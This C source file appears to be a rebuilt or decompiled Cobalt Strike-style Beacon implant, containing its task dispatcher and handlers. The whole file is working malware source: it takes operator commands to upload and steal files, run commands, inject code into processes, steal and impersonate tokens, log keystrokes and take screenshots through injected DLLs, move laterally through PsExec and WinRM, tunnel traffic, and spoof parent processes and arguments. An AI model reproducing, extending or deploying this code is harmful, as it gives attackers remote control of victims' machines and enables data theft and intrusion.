
//#include <processthreadsapi.h>
#include "BeaconTask.h"
#include "Utils.h"
#include "common.h"
#include "comm.h"
#include "ChildBeacon.h"
#include "BeaconJob.h"
#include "Beaconrportfwd.h"
#include "BeaconFileManage.h"
#include "BeaconLateralMovement.h"
#include "BeaconInject.h"
#include "BeaconBof.h"


void BeaconSleep(char* Taskdata, int Taskdata_size)
{
	datap pdatap;
	if (g_dwMilliseconds)
	{
		BeaconDataParse(&pdatap, Taskdata, Taskdata_size);
		g_dwMilliseconds = BeaconDataInt(&pdatap);
		g_jitter = BeaconDataInt(&pdatap);
		if (!g_jitter || g_jitter > 99)
		{
			g_jitter = 0;
		}
	}
}

/// <summary>
/// beacon cd命令
/// </summary>
/// <param name="Taskdata"></param>
/// <param name="Task_size"></param>
void BeaconCd(char* Taskdata, size_t Task_size)
{
	CHAR PathName[1024];

	if (Task_size <= 1023)
	{
		strncpy(PathName, Taskdata, Task_size);
		PathName[Task_size] = 0;
		SetCurrentDirectoryA(PathName);
	}
}



void beacon_upload(char* Taskdata, size_t Task_size, char* Mode)
{
	datap pdatap;
	char* Buffer = (char*)malloc(1024);
	if (Buffer)
	{
		BeaconDataParse(&pdatap, Taskdata, Task_size);
		if (!BeaconDataCopyToBuffer(&pdatap, Buffer, 1024))
		{
			free(Buffer);
			return;
		}
		FILE* fp = fopen(Buffer, Mode);                       // 打开文件
		if (fp != (FILE*)-1 && fp)
		{
			int size = BeaconDataLength(&pdatap);
			char* data = BeaconDataBuffer(&pdatap);
			fwrite(data, 1, size, fp);
			fclose(fp);
			free(Buffer);
			return;
		}
		free(Buffer);
		BeaconErrorD(8, GetLastError());
	}
}

/// <summary>
/// Beacon download命令
/// </summary>
/// <param name="Taskdata"></param>
/// <param name="Tasksize"></param>
void beacon_download(char* Taskdata, int Tasksize)
{

	datap* pdatap = BeaconDataInit(0x1000);
	char* filename = BeaconDataPtr(pdatap, 2048);
	char* lpBuffer = BeaconDataPtr(pdatap, 2048);
	datap Taskdatap;
	BeaconDataParse(&Taskdatap, Taskdata, Tasksize);
	BeaconDataCopyNToBuffer(&Taskdatap, filename, 2048);
	FILE* fp = fopen(filename, "rb");
	if (fp == (FILE*)-1 || !fp)
	{
		BeaconTaskErrorOutput(0x28, 0, 0, filename);
		BeaconDataFree(pdatap);
		return;
	}
	fseek(fp, 0, 2);
	__int64 fpsize = _ftelli64(fp);
	fseek(fp, 0, 0);
	if (__PAIR64__(HIDWORD(fpsize), fpsize) - 1 >= 0xFFFFFFFF)
	{
		BeaconTaskErrorOutput(0x3Cu, 0, 0, filename);
		BeaconDataFree(pdatap);
		fclose(fp);
		return;
	}
	DWORD path_size = GetFullPathNameA(filename, 0x800, lpBuffer, 0);
	if (! path_size || path_size > 0x800)
	{
		BeaconTaskErrorOutput(0x3D, 0, 0, filename);
		BeaconDataFree(pdatap);
		fclose(fp);
		return;
	}


	BeaconDownload* pBeaconDownload = (BeaconDownload*)malloc(sizeof(BeaconDownload));
	pBeaconDownload->number = download_number++;
	pBeaconDownload->Linked = gBeaconDownload;
	pBeaconDownload->fp = fp;
	pBeaconDownload->size = fpsize;
	gBeaconDownload = pBeaconDownload;

	formatp pformatp;
	BeaconFormatAlloc(&pformatp, 0x1000);
	BeaconFormatInt(&pformatp, pBeaconDownload->number);
	BeaconFormatInt(&pformatp, fpsize);
	BeaconFormatAppend(&pformatp, lpBuffer, path_size);
	int length = BeaconFormatlength(&pformatp);
	char* buffer = BeaconFormatOriginalPtr(&pformatp);
	BeaconTaskOutput(buffer, length, 2);
	BeaconFormatFree(&pformatp);
	BeaconDataFree(pdatap);
}

/// <summary>
/// 处理Beacon execute命令
/// </summary>
/// <param name="Taskdata"></param>
/// <param name="Task_size"></param>
void beacon_execute(char* Taskdata, size_t Task_size)
{
	char Path[1024];

	STARTUPINFOA StartupInfo = { 0 };
	StartupInfo.cb = sizeof(STARTUPINFOA);
	_PROCESS_INFORMATION processInfo = {0};
	GetStartupInfoA(&StartupInfo);
	StartupInfo.dwFlags = 257;
	StartupInfo.wShowWindow = 0;
	StartupInfo.hStdOutput = 0;
	StartupInfo.hStdError = 0;
	StartupInfo.lpDesktop = 0;
	if (Task_size <= 1023)
	{
		strncpy(Path, Taskdata, Task_size);
		Path[Task_size] = 0;
		BeaconExecuteCommand(Path, Task_size, &StartupInfo, &processInfo, 0, 0);
		BeaconcloseAllHandle(&processInfo);
	}
}

/// <summary>
/// 处理Beacon spawnto命令x86对应功能号13 x86对应功能号x64
/// 当Task_size
/// </summary>
/// <param name="Taskdata">路径</param>
/// <param name="Task_size">大小</param>
/// <param name="x86">架构</param>
void beacon_SpawnTo(char* Taskdata, size_t Task_size, int x86)
{
	//这里的BeaconDataInit不需要释放这是全局变量
	if (!spawntoPath_x86 && !spawntoPath_x64)
	{
		datap* datap = BeaconDataInit(0x200);
		spawntoPath_x86 = BeaconDataPtr(datap, 256);
		spawntoPath_x64 = BeaconDataPtr(datap, 256);
	}
	//当task等于0时会清除先前的设置
	if (Task_size && Task_size <= 256)
	{
		if (x86)
		{
			memset(spawntoPath_x86, 0, 0x100);
			memcpy(spawntoPath_x86, Taskdata, Task_size);
		}
		else
		{
			memset(spawntoPath_x64, 0, 0x100);
			memcpy(spawntoPath_x64, Taskdata, Task_size);
		}
	}
	else
	{
		memset(spawntoPath_x86, 0, 0x100u);
		memset(spawntoPath_x64, 0, 0x100u);
	}
	return;

}




void BeaconVNCReflectiveDLL(char* Taskdata, int Task_size, BOOL x86)
{
	short vnc_port = ntohs(*(short*)Taskdata);
	BeaconSpawnX86(1, Taskdata + 2, Task_size - 2, x86);
	vnc_port = htons(vnc_port);
	BeaconTaskOutput((char*)&vnc_port, 2, 7);
}

/// <summary>
/// 和vnc反射注入有关
/// </summary>
/// <param name="Taskdata"></param>
/// <param name="Task_size"></param>
/// <param name="x86"></param>
void BeaconVNCInject(char* Taskdata, int Task_size, int x86)
{
	BeaconReflectiveDLLInject(Taskdata + 2, Task_size - 2, x86);
	short size = htons(ntohs(*(u_long*)Taskdata));
	BeaconTaskOutput((char*)&size, 2, 7);
}

void SpawnProcessInjection(int timeout,int p_offset,char* payload,size_t payloadsize,char* arg,int a_len,char* jobname,BOOL x86,int ignoreToken)
{
	check_close_token_fake(ignoreToken);


	PROCESS_INFORMATION pi = {0};

	HANDLE hReadPipe;
	HANDLE hWritePipe;
	SECURITY_ATTRIBUTES PipeAttributes = {0};
	PipeAttributes.lpSecurityDescriptor = 0;
	PipeAttributes.nLength = sizeof(SECURITY_ATTRIBUTES);
	PipeAttributes.bInheritHandle = 1;
	
	CreatePipe(&hReadPipe, &hWritePipe, &PipeAttributes, 0x100000u);

	STARTUPINFOA StartupInfo = { 0 };
	StartupInfo.cb = sizeof(STARTUPINFOA);
	GetStartupInfoA(&StartupInfo);
	StartupInfo.hStdInput = 0;
	StartupInfo.wShowWindow = 0;
	StartupInfo.hStdOutput = hWritePipe;
	StartupInfo.hStdError = hWritePipe;
	StartupInfo.dwFlags = 257;

	if (BeaconSpawnTemporaryProcess(x86, ignoreToken, &StartupInfo, &pi))
	{
		Sleep(0x64u);
		ProcessInject(pi.dwProcessId, &pi, pi.hProcess, payload, payloadsize, p_offset, arg, a_len);
		if (timeout)
		{
			CheckTimeout(hReadPipe, timeout);
		}
		Add_Beacon_0Job(pi.hProcess, pi.hThread, pi.dwProcessId, pi.dwThreadId, hReadPipe, hWritePipe, jobname);
	}
	check_restore_token_fake(ignoreToken);
}

void __cdecl SpawnProcessInjectionJob(char* Taskdata, int Task_size, int x86, int ignoreToken)
{

	datap* pdatap = BeaconDataInit(0x40u);
	char* jobname = BeaconDataPtr(pdatap, 64);

	datap ptaskdatp;
	BeaconDataParse(&ptaskdatp, Taskdata, Task_size);
	BeaconDataShort(&ptaskdatp);
	short timeout = BeaconDataShort(&ptaskdatp);
	int p_offset = BeaconDataInt(&ptaskdatp);
	BeaconDataCopyToBuffer(&ptaskdatp, jobname, 64);
	int a_len = BeaconDataInt(&ptaskdatp);
	char* arg;
	if (a_len)
	{
		arg = BeaconDataPtr(&ptaskdatp, a_len);
	}
	else
	{
		arg = 0;
	}

	int payloadsize = BeaconDataLength(&ptaskdatp);
	char* payload = BeaconDataBuffer(&ptaskdatp);
	SpawnProcessInjection(timeout, p_offset, payload, payloadsize, arg, a_len, jobname, x86, ignoreToken);
	BeaconDataClear(pdatap);
	BeaconDataFree(pdatap);
}

void beacon_runu(char* Taskdata, int Task_size)
{

	STARTUPINFOA StartupInfo = { 0 };
	PROCESS_INFORMATION pi;
	StartupInfo.cb = sizeof(STARTUPINFOA);
	GetStartupInfoA(&StartupInfo);
	StartupInfo.dwFlags = 257;
	StartupInfo.wShowWindow = 0;
	StartupInfo.hStdInput = 0;
	StartupInfo.hStdOutput = 0;
	StartupInfo.hStdError = 0;

	datap* pdatap = BeaconDataInit(0x2000u);
	char* cmd = BeaconDataPtr(pdatap, 0x2000);

	datap taskdatap;
	BeaconDataParse(&taskdatap, Taskdata, Task_size);
	int PPID = BeaconDataInt(&taskdatap);

	BeaconDataCopyToBuffer(&taskdatap, cmd, 0x2000);
	BeaconCreateProcess(cmd, strlen(cmd), &StartupInfo, &pi, 16, 0, PPID);
	BeaconDataClearFree(pdatap);
	BeaconcloseAllHandle(&pi);
}

void Task_handle(char* Taskdata, size_t Task_size, int Task_id)
{
    //自添加
    HANDLE threadbuff = NULL;
	switch (Task_id)
	{
	case 1:
		BeaconSpawnX86(1, Taskdata, Task_size, 1);
		return;
	case 3:
		Beacon_end();	// exit Beacon
		return;
	case 4:
		BeaconSleep(Taskdata, Task_size);	//sleep
		return;
	case 5:
		BeaconCd(Taskdata, Task_size);      // cd
		return;
	case 9:
		BeaconReflectiveDLLInject(Taskdata, Task_size, 1);// x86 内部反射dll注入 实现keyLogger Printscreen PsInject Screenshot Screenwatch之类的
		return;
	case 10:
		beacon_upload(Taskdata, Task_size, (char*)"wb");// 处理所有向目标上传文件的操作 upload，elevate[sve-exe]
		return;
	case 11:
		beacon_download(Taskdata, Task_size); // 下载文件
		return;
	case 12:
		beacon_execute(Taskdata, Task_size);  // execute
		return;
	case 13:
		beacon_SpawnTo(Taskdata, Task_size, 1);
		return;
	////////////////////
	case 14:
		sub_10006B2B(Taskdata, Task_size);
		return;
	case 15:
		sub_10006CFC(Taskdata, Task_size);
		return;
	case 16:
	{
		BeaconRportfwd* pgBeaconRportfwd = gBeaconRportfwd;
		u_long unknown = ntohl(*(u_long*)Taskdata);
		while (pgBeaconRportfwd)
		{
			if (pgBeaconRportfwd->state && unknown == pgBeaconRportfwd->field_0 && pgBeaconRportfwd->field_10 != 2)
			{
				pgBeaconRportfwd->state = 0;
			}
			pgBeaconRportfwd = pgBeaconRportfwd->Linked;
		}
		return;
	}

	case 17:
		sub_10006ACD(Taskdata);
		return;
	////////////////////

	case 18:
		BeaconVNCReflectiveDLL(Taskdata, Task_size, 1); // 和vnc反射dll注入有关
		return;
	case 19:
	{
		//取消下载
		BeaconDownload* pgBeaconDownload = gBeaconDownload;
		int v4 = ntohl(*(DWORD*)Taskdata);
		while (pgBeaconDownload)
		{
			if (pgBeaconDownload->number == v4)
			{
				fclose(pgBeaconDownload->fp);
				pgBeaconDownload->size = 0;
			}
			pgBeaconDownload = pgBeaconDownload->Linked;
		}
		return;
	}
	case 22:
		//请求子beacon
		BeaconRequestChildBeacon(Taskdata, Task_size);
		return;
	case 23:
		BeaconUnlink(ntohl(*(u_long*)Taskdata));// unlink
		return;
	case 24:
	{
		int ChildBeaconId = ntohl(*(u_long*)Taskdata);
		int i;
		for (i = 0; i <= gChildBeaconInfoSize; i++)
		{
			if (ChildBeaconId == gChildBeaconInfo[i].ChildBeaconId || gChildBeaconInfo[i].state == 1)
			{
				break;
			}
			if (i >= gChildBeaconInfoSize)
			{
				return;
			}
		}
		BeaconTaskOutput(gChildBeaconInfo[i].ChildBeaconData, gChildBeaconInfo[i].ChildBeaconDataSize, 10);
		return;
	}
	case 27:
		beacon_GetUID();                          // GetUID
		return;
	case 28:
		BeaconRevertToken();                        // Rev2Self
		return;
	case 31:
		beacon_steal_token(Taskdata, Task_size);// steal_token
		return;
	case 32:
		beacon_ps(Taskdata, Task_size);       // ps
		return;
	case 33:
		beacon_Kill(Taskdata, Task_size);     // Kill
		return;
	case 37:
		BeaconPowerShellImport(Taskdata, Task_size);    // 37 powershellImport
		return;
	case 38:
		beacon_RunAs(Taskdata, Task_size);    // RunAs
		return;
	case 39:
		beacon_pwd();                             // pwd
		return;
	case 40:
		BeaconBackstageJob(0, Taskdata, Task_size, 0);
		return;
	case 41:
		beacon_jobs();                            // jobs
		return;
	case 42:
		beacon_JobKill(Taskdata, Task_size);      // JobKill
		return;
	case 43:
		BeaconReflectiveDLLInject(Taskdata, Task_size, 0);// beacon_Inject
		return;
	case 44:
		BeaconSpawnX86(1, Taskdata, Task_size, 0);  // cs自身功能，需要创建进程的spawn ShellcodeSpawn SpawnAndTunnel
		return;
	case 45:                                    // 45和46 和vnc注入有关
		BeaconVNCInject(Taskdata, Task_size, 1);
		return;
	case 46:
		BeaconVNCInject(Taskdata, Task_size, 0);
		return;
	case 47:
		BeaconSleepN(Taskdata, Task_size);
		return;
	case 49:
		beacon_make_token(Taskdata, Task_size);   // make_token
		return;
	case 50:
		sub_100071B7(Taskdata, Task_size, 0);     // PortForward,PortForwardLocal rportfwd start
		return;
	case 51:
		sub_1000728D(Taskdata, Task_size);        // rportfwd Stop
		return;
	case 52:
		SendStageTCP(Taskdata, Task_size);
		return;
	case 53:
		BeaconLs(Taskdata, Task_size);        // 文件浏览器相关
		return;
	case 54:
		beacon_MkDir(Taskdata, Task_size);        // MkDir
		return;
	case 55:
		GetDrivesList(Taskdata, Task_size);        // GetLogicalDrives
		return;
	case 56:
		beacon_rm(Taskdata, Task_size);           // rm
		return;
	case 57:
		NamedPipesSendData(Taskdata, Task_size);        // 和PsExecPSH
		return;
	case 59:
		ScriptCradle(Taskdata, Task_size);          // jump_WinRM
		return;
	case 60:
		StartNamedPipeReceiveData(Taskdata, Task_size);
		return;
	case 61:
		ImpersonationToken();
		return;
	case 62:
		BeaconBackstageJob(1, Taskdata, Task_size, 0);
		return;
	case 67:
		beacon_upload(Taskdata, Task_size, (char*)"ab"); // 上传文件
		return;
	case 68:
		link_Smb_Beacon(Taskdata);
		return;
	case 69:
		beacon_SpawnTo(Taskdata, Task_size, 0);   // SpawnTo
		return;
	case 70:
		SpawnProcessInjectionJob(Taskdata, Task_size, 1, 1);
		return;
	case 71:
		SpawnProcessInjectionJob(Taskdata, Task_size, 0, 1);
		return;
	case 72:
		beacon_SetEnv(Taskdata);                  // SetEnv
		return;
	case 73:
		beacon_copy(Taskdata, Task_size);         // cp
		return;
	case 74:
		beacon_Move(Taskdata, Task_size);         // Move
		return;
	case 75:
		beacon_PPID(Taskdata, Task_size);         // PPID
		return;
	case 76:
		beacon_runu(Taskdata, Task_size);         // runu
		return;
	case 77:
		beacon_GetPrivs(Taskdata, Task_size);     // GetPrivs
		return;
	case 78:
		BeaconRunCommand(Taskdata, Task_size);        // runCommand Run Shell
		return;
	case 79:
		BeaconWebDelivery(Taskdata, Task_size);
		return;
	case 82:
		BeaconTcpPivot(Taskdata, Task_size);        // tcppivot 中转监听器 rportfwd port 监听器
		return;
	case 83:
		BeaconSpoofArgsAdd(Taskdata, Task_size);        // SpoofArgsAdd 设置进程路径和假命令
		return;
	case 84:
		SpoofArgsRemove(Taskdata, Task_size);        // SpoofArgsRemove
		return;
	case 85:
		SpoofArgsList();                           // SpoofArgsList 查看参数欺骗
		return;
	case 86:
		connect_tcp_child_Beacon(Taskdata, Task_size);// Connect tcp beacon
		return;
	case 87:
		SpawnProcessInjectionJob(Taskdata, Task_size, 1, 0);  // ExecuteAssembly
		return;
	case 88:
		SpawnProcessInjectionJob(Taskdata, Task_size, 0, 0);// ExecuteAssembly
		return;
	case 89:
		BeaconSpawnX86(0, Taskdata, Task_size, 1);
		return;
	case 90:
		BeaconSpawnX86(0, Taskdata, Task_size, 0);
		return;
	case 91:
		BeaconVNCReflectiveDLL(Taskdata, Task_size, 0);
		return;
	case 92:
		beacon_BlockDLLs(Taskdata, Task_size);    // BlockDLLs
		return;
	case 93:                                    // spawnas 93 94
		BeaconSpawnas(Taskdata, Task_size, 1);     // COMMAND_SPAWNAS_X86
		return;
	case 94:
		BeaconSpawnas(Taskdata, Task_size, 0);     // COMMAND_SPAWNAS_X64
		return;
	case 98:                                    // spawnu 98 99 
		BeaconSpawnu(Taskdata, Task_size, 1);     // COMMAND_SPAWNU_X86
		return;
	case 99:
		BeaconSpawnu(Taskdata, Task_size, 0);     // COMMAND_SPAWNU_X64
		return;
	case 100:
        //自添加
        VOID* arg[2];
        arg[0] = Taskdata;
        arg[1] = &Task_size;
        galaEvent = CreateMutex(NULL, FALSE, NULL);
        threadbuff = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)beacon_bof, arg, 0, NULL);
        WaitForMultipleObjects(1, (HANDLE*) &threadbuff, TRUE, INFINITE);
		//beacon_bof(Taskdata, Task_size);          // bof DllLoad,Elevate[BypassUACToken,PsExec],GetSystem,RegQuery,remoteexec,runasadmin,TimeStomp
		return;
	case 101:
		BeaconBackstageJob(0, Taskdata, Task_size, 1);// Printscreen,Screenshot,Screenwatch,keylogger 后渗透任务jobs相关
		return;
	case 102:
		sub_100071B7(Taskdata, Task_size, 0x100007F);// SpawnAndTunnel
		return;
	default:
		return;
	}
}

void Parse_Task(BeaconTask* beaconTask, size_t length)
{
	if (length)
	{
		BeaconTask* pbeaconTask = beaconTask;
		while (true)
		{
			int Task_length = ntohl(pbeaconTask->length);
			int Task_id = ntohl(pbeaconTask->id);
			if ((char*)pbeaconTask + Task_length + 8 >= (char*)beaconTask+ length)
			{
                //任务执行
				Task_handle(pbeaconTask->data, Task_length, Task_id);
				break;
			}
			Task_handle(pbeaconTask->data, Task_length, Task_id);
			*(ULONG_PTR*)&pbeaconTask = (ULONG_PTR)((char*)pbeaconTask+Task_length + 8);
		}
	}
	memset(beaconTask, 0, length);
}